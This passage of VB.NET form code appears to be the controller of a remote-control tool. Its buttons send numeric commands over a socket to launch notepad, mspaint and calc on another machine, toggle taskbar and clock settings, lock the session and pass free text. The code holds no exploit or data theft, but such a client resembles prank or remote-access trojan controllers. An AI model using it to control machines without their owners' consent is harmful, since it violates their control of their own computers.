    Private Sub Button87_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button87.Click
        senddata("63")

    End Sub

    Private Sub Button86_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button86.Click
        senddata("64")

    End Sub



    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If sock.Connected = True Then
            ipsend(Label6.Text)

            Timer1.Enabled = False
        End If
    End Sub


    Private Sub Button88_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button88.Click
        debug.Show()
    End Sub

    Private Sub Button90_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button90.Click
        senddata("27*notepad.exe")
    End Sub

    Private Sub Button91_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button91.Click
        senddata("27*mspaint.exe")
    End Sub

    Private Sub btnAutoHide_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAutoHide.Click


        Select Case btnAutoHide.Text
            Case "Auto Hide TaskBar"
                btnAutoHide.Text = "Auto Hide TaskBar Off"
                senddata("67")
            Case "Auto Hide TaskBar Off"
                btnAutoHide.Text = "Auto Hide TaskBar"
                senddata("79")
        End Select
    End Sub

    Private Sub btnTop_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnTop.Click

        Select Case btnTop.Text
            Case "Keep TaskBar on Top"
                senddata("68")

                btnTop.Text = "Don't Keep TaskBar on Top"
            Case "Don't Keep TaskBar on Top"
                senddata("80")

                btnTop.Text = "Keep TaskBar on Top"
        End Select
    End Sub

    Private Sub btnGroup_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnGroup.Click


        Select Case btnGroup.Text
            Case "Group Similar TaskBar Buttons"
                senddata("69")
                btnGroup.Text = "Don't Group Similar TaskBar Buttons"
            Case "Don't Group Similar TaskBar Buttons"
                senddata("81")
                btnGroup.Text = "Group Similar TaskBar Buttons"
        End Select
    End Sub

    Private Sub btnContents_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnContents.Click

        Select Case btnContents.Text
            Case "Show Taskbar Contents"
                senddata("70")

                btnContents.Text = "Hide Taskbar Contents"

            Case "Hide Taskbar Contents"
                senddata("82")
                btnContents.Text = "Show Taskbar Contents"

        End Select

    End Sub

    Private Sub btnClock_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnClock.Click
        If btnClock.Text = "Hide Clock" Then
            senddata("71")
            btnClock.Text = "Show Clock"
        Else
            senddata("77")
            btnClock.Text = "Hide Clock"
        End If

    End Sub

    Private Sub btnFavourites_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnFavourites.Click


        Select Case btnFavourites.Text
            Case "Show Favourites In Menu"
                senddata("72")
                btnFavourites.Text = "Hide Favourites In Menu"

            Case "Hide Favourites In Menu"


                btnFavourites.Text = "Show Favourites In Menu"
        End Select

    End Sub

    Private Sub btnStartButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        senddata("73")
    End Sub

    Private Sub btnInactiveTrayIcons_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        senddata("74")
    End Sub

    Private Sub btnText_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        senddata("75")
    End Sub



    Private Sub btnLock_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnLock.Click
        senddata("78")
    End Sub

    Private Sub Button92_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button92.Click
        senddata("83*" & TextBox17.Text)
    End Sub

    Private Sub Button93_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button93.Click
        senddata("84")

    End Sub

    Private Sub Button95_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button95.Click
        senddata("27*calc.exe")

    End Sub

    Private Sub Button94_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button94.Click
        senddata("85")

    End Sub
End Class
